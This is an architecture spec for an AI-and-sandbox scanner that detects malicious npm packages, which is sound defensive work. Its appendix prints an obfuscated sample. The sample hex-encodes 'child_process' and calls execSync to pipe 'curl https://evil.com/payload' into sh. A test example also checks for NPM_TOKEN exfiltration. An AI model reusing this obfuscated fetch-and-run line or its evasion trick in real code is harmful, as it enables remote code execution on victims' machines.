# NpmGuard Engine v2 — Architecture Specification

> AI-first security analysis with verifiable proofs.
> Replaces regex-based detection with agentic investigation backed by instrumented sandbox execution.

---

## Design Philosophy

**The arms race problem.** Regex-based detection is a catalogue of known attack signatures. Attackers read the source, change one line, and bypass every pattern. This is not a theoretical concern — it is the fundamental failure mode of every signature-based scanner in cybersecurity history.

**The solution.** Replace pattern matching with _reasoning_. An LLM agent reads code, follows obfuscation, executes snippets in a sandbox, and observes what the code _actually does_ — the same workflow a human security researcher uses. Novel attacks are caught because the agent reasons about behavior, not syntax.

**Verifiability.** "The AI said it's bad" is not a proof. Every finding must produce a verifiable artifact: a content hash (anchoring the analyzed code) a reproducible sandbox test (concrete behavioral evidence). Any third party can verify all independently.

### What regex is still good for

Regex stays where obfuscation is structurally impossible:

| Check                                | Why regex is correct                                          |
| ------------------------------------ | ------------------------------------------------------------- |
| Tarball path traversal (`../`)       | Tar format property — can't obfuscate tar entry names         |
| Shell pipe in `package.json` scripts | npm reads script fields literally — no JS evaluation          |
| Anti-AI prompt injection             | Must detect LLM-hijack strings WITHOUT feeding them to an LLM |
| Binary magic bytes in a JS package   | Structural property of file headers                           |

Everything else is AI-driven.

---

## Pipeline Overview

```
npm package
    |
    v
Phase 0: INVENTORY (structural triage, no execution, no LLM)
    |
    v
Phase 1: AI ANALYSIS (the core)
    |
    |-- 1a: Triage        (cheap model, full package, risk score)
    |      |
    |      v
    |-- 1b: Investigation  (powerful model, agentic loop, Docker sandbox + kernel monitors)
    |      |
    |      v
    |-- 1c: Test gen       (auto-generate proof tests from findings)
    |
    v
Phase 2: PROOF GENERATION
    |-- run generated tests in sandbox
    |-- collect kernel monitor logs as evidence
    |-- hash source files (content integrity)
    |
    v
AuditReport { verdict, capabilities, proofs[] }
```

Every path through the pipeline terminates at proof generation. Phase 0 dealbreakers produce structural proofs. Phase 1a low-risk packages still get a triage proof (the model's reasoning + content hashes). There is no verdict without a proof artifact.

### Phase handoff contracts

Each phase narrows and hardens the previous phase's output:

| From → To | What passes | Purpose |
|---|---|---|
| Inventory → Triage | Files, metadata, structural flags | "Here's the package, here are free red flags" |
| Triage → Investigation | Focus areas (file + **line range** + reason), capabilities per file | "Look here, for this reason" — the lead sheet |
| Investigation → Test-gen | Findings (capability, evidence, reproduction strategy) | "I observed X — here's how to prove it deterministically" |
| Test-gen → Verify | Proof scripts (runnable tests that demonstrate the finding) | "Run this, assert that" |

**Confidence escalation:** SUSPECTED (triage flagged it) → LIKELY (investigation corroborated) → CONFIRMED (test reproduced it). Each phase converts opinion into evidence.

---

## Phase 0: Inventory

Fast structural triage (~30 sec). No JS execution. No LLM.

- Parse `package.json` (lifecycle scripts, entry points, dependencies)
- Walk file tree, classify files by extension and magic bytes
- Run dealbreaker checks (path traversal, shell pipes, missing install files)
- Accumulate structural flags (binaries, dotfiles, encoded content, minified scripts)

**Output:** `InventoryReport` with metadata, scripts, entry points, file classification, flags, optional dealbreaker.

If a dealbreaker is found, it still produces a structural proof (content hash + the specific violation) before emitting a `DANGEROUS` verdict. No verdict without proof.

---

## Phase 1: AI Analysis

### Phase 1a: Triage

**Goal:** Cheap, fast risk assessment to filter out the 80-90% of packages that are obviously benign (lodash, express, etc.), saving the cost of deep analysis.

**Model:** Haiku-class or equivalent cheap model with large context window.

**Input:** The entire package content. Every file, untruncated. If a file is too large to fit in context, that is itself a red flag and gets flagged as such.

Specifically:

- Full `package.json`
- Complete source of every `.js`, `.mjs`, `.cjs`, `.ts`, `.json` file
- Inventory flags from Phase 0
- File listing with sizes

**Output:** Structured response:

```python
class TriageResult(BaseModel):
    risk_score: int             # 0-10
    risk_summary: str           # one-line explanation
    focus_areas: list[FocusArea]

class FocusArea(BaseModel):
    file: str                   # e.g. "lib/loader.js"
    lines: str | None           # e.g. "42-80" (optional, LLM may not always know)
    reason: str                 # e.g. "obfuscated string concatenation building a URL"
```

**Decision threshold:** If `risk_score < 3`, the package still flows through Phase 2 for proof generation, but Phase 1b investigation is skipped. The triage reasoning + content hashes become the proof artifact for a `SAFE` verdict. Most legitimate packages will score 0-2.

**What the triage model looks for** (via system prompt, not regex):

- Install scripts that do anything beyond running node on a file
- Network calls in unexpected places
- Obfuscation patterns (string concatenation, base64, eval chains)
- Filesystem access to sensitive paths
- Environment variable harvesting
- Code that doesn't match the package's stated purpose
- Encoded or encrypted data blobs
- Anything else that looks suspicious

The triage prompt is intentionally broad. We want false positives here (caught by 1b), not false negatives (missed entirely).

### Phase 1b: Agentic Investigation

**Goal:** Deep, multi-turn AI analysis of suspicious code. The agent reads code, forms hypotheses, executes snippets in a sandboxed Docker container, observes results, and follows leads. This is the core of the system.

**Model:** Sonnet/Opus-class. The most capable model available.

**Turn budget:** Configurable parameter (`max_agent_turns`, default: 30). The agent gets this many tool-call turns to investigate. For simple packages this is overkill; for complex obfuscated payloads the agent may use all of them.

**Architecture — sandbox + kernel monitors:**

```
+------------------------------------------+
|  AI AGENT (host)                         |
|                                          |
|  LLM  <-->  Tool Router                  |
|              |                            |
|         Docker API                        |
|              |                            |
+--------------|----------------------------+
               |
     +---------v----------------------------+
     | DOCKER SANDBOX (ephemeral container)  |
     |                                       |
     |  /pkg  (read-only mount, the package) |
     |  /tmp  (tmpfs, scratch space)         |
     |                                       |
     |  - no outbound network                |
     |  - drops root (--user 1000:1000)      |
     |  - --cap-drop=ALL                     |
     |  - hard timeout per exec              |
     |                                       |
     +---------------------------------------+
               |
     +---------v----------------------------+
     | KERNEL-LEVEL MONITORS                 |
     | (eBPF / audit subsystem)              |
     |                                       |
     |  - env: environment variable access   |
     |  - fs:  file reads, writes, stats     |
     |  - net: connect, sendto, DNS lookups  |
     |  - proc: fork, exec, spawned children |
     |    (recursive — child processes get   |
     |     the same monitors)                |
     |                                       |
     | All events -> structured log          |
     +---------------------------------------+
```

The package lives **entirely** inside the Docker container, mounted read-only at `/pkg`. The AI agent is outside — it interacts with the sandbox exclusively through the Docker API (`docker exec`). If the package exploits a Node.js vulnerability, it's trapped in the container.

Kernel-level monitors (eBPF probes or Linux audit subsystem) are attached to the container's cgroup/namespace. They observe everything the package does at the syscall level — no instrumentation the package can detect or evade. Spawned child processes inherit the same monitoring. The monitor output is a structured event log that becomes part of the evidence chain.

**Output sanitization:** Docker stdout/stderr is truncated to a max size (e.g., 64KB), stripped of ANSI codes, and checked for prompt injection patterns before being passed to the LLM. The kernel monitor log is separate and tamper-proof — it comes from outside the container.

**Agent system prompt** directs the investigation:

1. Read the package code, starting from focus areas identified by triage
2. Follow require chains, trace data flow
3. Execute code in the sandbox to deobfuscate and observe runtime behavior
4. Cross-reference agent observations with kernel monitor logs
5. For each suspicious behavior, document:
   - What capability it demonstrates (from CapabilityEnum)
   - What attack pathway it matches (from AttackPathway, or "NOVEL")
   - The file and line range with evidence
   - A hypothesis for how to prove it in a reproducible test
6. If the package has lifecycle hooks, investigate those first (highest risk)

**Output:**

```python
class Finding(BaseModel):
    capability: CapabilityEnum
    attack_pathway: AttackPathway | str  # known pathway or "NOVEL"
    confidence: Confidence               # SUSPECTED, LIKELY, CONFIRMED
    file: str
    lines: str | None
    evidence: str                        # what was observed
    reasoning: str                       # agent's chain of thought
    reproduction_strategy: str           # how to prove this in a test

class Confidence(StrEnum):
    SUSPECTED = "SUSPECTED"   # code looks suspicious but not confirmed
    LIKELY = "LIKELY"         # multiple signals corroborate
    CONFIRMED = "CONFIRMED"   # observed in sandbox execution
```

Findings with `CONFIRMED` confidence (agent saw the behavior in sandbox) are the strongest. `SUSPECTED` and `LIKELY` findings still produce proofs but at lower confidence, and the auto-generated test in Phase 1c is their chance to upgrade to `CONFIRMED`.

### Phase 1c: Test Generation

**Goal:** For each finding from 1b, auto-generate a self-contained Vitest test that proves the behavior. This is the bridge between AI analysis and deterministic proof.

**Model:** Sonnet-class.

**Input:** Findings from 1b + the package source.

**Output:** One `.test.js` file per finding (or a single file with multiple test cases).

**What the generated test does:**

- Sets up the right environment stubs (`vi.stubEnv`)
- Installs MSW HTTP handlers to intercept network calls
- Spies on the right functions (`vi.spyOn`)
- Sets fake timers if needed (`vi.useFakeTimers`)
- Loads/requires the package
- Advances timers if needed
- Asserts the claimed behavior

**Example — auto-generated test for credential theft:**

```javascript
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { server } from "../harness/server.js";
import { http, HttpResponse } from "msw";
import { runPackage } from "../harness/sandbox-runner.js";

describe("credential-theft: reads NPM_TOKEN and POSTs to C2", () => {
  let capturedBody = null;

  beforeEach(() => {
    vi.stubEnv("NPM_TOKEN", "canary-token-npmguard-test");
    server.use(
      http.post("*", async ({ request }) => {
        capturedBody = await request.text();
        return HttpResponse.json({ ok: true });
      }),
    );
  });

  afterEach(() => {
    vi.unstubAllEnvs();
  });

  it("exfiltrates NPM_TOKEN via HTTP POST", async () => {
    await runPackage("the-package");
    expect(capturedBody).toContain("canary-token-npmguard-test");
  });
});
```

The generated test is saved alongside the package analysis artifacts and becomes part of the proof chain.

---

## Phase 2: Proof Generation

Produces the final proof set. Every finding becomes a proof artifact or it doesn't ship.

### For auto-generated tests

- Run each test in the sandbox with kernel monitors active
- Passing test + kernel monitor log = `CONFIRMED` proof
- Failing test: finding stays at original confidence (still reported, but noted as unconfirmed)
- Test result + kernel monitor events + content hash = proof artifact

### For structural findings (Phase 0)

- Content hash of the offending file + the specific violation = structural proof

### For triage-only findings (low-risk packages that skipped 1b)

- Triage model reasoning + content hashes of all source files = triage proof

---

## Proof Model

```python
class ProofKind(StrEnum):
    # Structural (regex, unevadable)
    STRUCTURAL = "STRUCTURAL"

    # AI-discovered (LLM reasoning)
    AI_STATIC = "AI_STATIC"             # found by reading code
    AI_DYNAMIC = "AI_DYNAMIC"           # found by executing in sandbox

    # Auto-generated test
    TEST_CONFIRMED = "TEST_CONFIRMED"   # auto-generated vitest passed
    TEST_UNCONFIRMED = "TEST_UNCONFIRMED"  # test was generated but failed

class Proof(BaseModel):
    # What was found
    capability: CapabilityEnum
    attack_pathway: AttackPathway | str
    confidence: Confidence

    # Where in the code
    file_line: str               # "lib/loader.js:42-67"
    problem: str                 # human-readable description
    evidence: str                # concrete data (truncated to 500 chars)

    # Verifiability
    kind: ProofKind
    content_hash: str            # SHA-256 of source file at detection time

    # Reproducibility
    reproducible: bool
    reproduction_cmd: str | None      # command to re-verify
    test_file: str | None             # path to auto-generated test
    test_hash: str | None             # SHA-256 of test file

    # AI provenance
    reasoning_hash: str | None        # SHA-256 of agent reasoning trace
    tee_attestation_id: str | None    # 0G Compute attestation ID
```

### Proof verification by third parties

Anyone can verify a proof independently:

1. **Content integrity:** Download the package, hash the file at `file_line` -> must match `content_hash`
2. **Test reproduction:** Run the test at `test_file` -> must pass (for `TEST_CONFIRMED` proofs)

---

### Container isolation

| Property     | Setting                                                                                                  |
| ------------ | -------------------------------------------------------------------------------------------------------- |
| Package      | Read-only bind mount at `/pkg` — the entire package lives in the container                               |
| Network      | `--network=none` (completely isolated) OR custom bridge with transparent proxy for intercepting requests |
| Filesystem   | `tmpfs` at `/tmp` for scratch; `/pkg` is read-only; no other host mounts                                 |
| User         | Drops to non-root (`--user 1000:1000`)                                                                   |
| Resources    | `--memory=256m --cpus=0.5` (prevent resource exhaustion)                                                 |
| Timeout      | Hard kill after configurable timeout (default 15 sec per exec)                                           |
| Capabilities | `--cap-drop=ALL` (no Linux capabilities)                                                                 |
| Seccomp      | Default Docker seccomp profile (blocks dangerous syscalls)                                               |
| Monitoring   | eBPF probes / audit subsystem attached to container cgroup — env, fs, net, process events                |

---

## Appendix: Why Not Just Regex

A concrete example. Consider this real obfuscation pattern (WAVESHAPER variant):

```javascript
const _0x = ["\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73"];
const m = require(_0x[0]);
m["exe" + "cSync"]("curl https://evil.com/payload | sh");
```

- **Regex for `child_process`:** MISS (hex-encoded string in array)
- **Regex for `execSync`:** MISS (string concatenation)
- **Regex for `curl`:** Maybe catches this specific case, but attacker switches to `https.request`
- **LLM reading code:** Likely catches it, but may hallucinate on deeper obfuscation
- **LLM + sandbox execution:** Agent evaluates the hex string in the sandbox -> sees "child_process". Loads the package -> kernel monitors observe `child_process.execSync` call with `curl` command. **Confirmed.**

The agent doesn't need to know the obfuscation technique. It just runs the code and watches what happens.

---

## Appendix: Comparison with Shannon

Shannon (web app pentest) and NpmGuard v2 (package audit) share the same philosophy but differ in domain:

|                | Shannon                                               | NpmGuard v2                                           |
| -------------- | ----------------------------------------------------- | ----------------------------------------------------- |
| Target         | Live web application                                  | npm package (static artifact)                         |
| Attack surface | HTTP endpoints, auth, business logic                  | Lifecycle hooks, require chain, env, fs, net          |
| "Execution"    | Browser automation (Playwright)                       | Docker sandbox + kernel-level monitors                |
| Proof          | Working exploit against live app                      | Passing sandbox test + kernel monitor log             |
| Agent tools    | Browser navigation, form filling, API calls           | Docker exec, kernel monitor logs                      |
| Multi-agent    | 13 specialized agents (recon, vuln, exploit per type) | 3 phases (triage, investigation, test gen)            |
| Verification   | Exploit succeeds = proven                             | Test passes + content hash + TEE attestation          |
| Temporal       | Workflow orchestration with crash recovery            | Same                                                  |

Key borrowed concepts:

- **"POC or it didn't happen"** -> auto-generated tests as proof
- **Evidence classification levels** -> SUSPECTED / LIKELY / CONFIRMED
- **Agent has execution tools** -> Docker sandbox tools
- **Structured output queues** -> findings feed into test generation
- **Pipelined execution** -> triage filters before expensive analysis
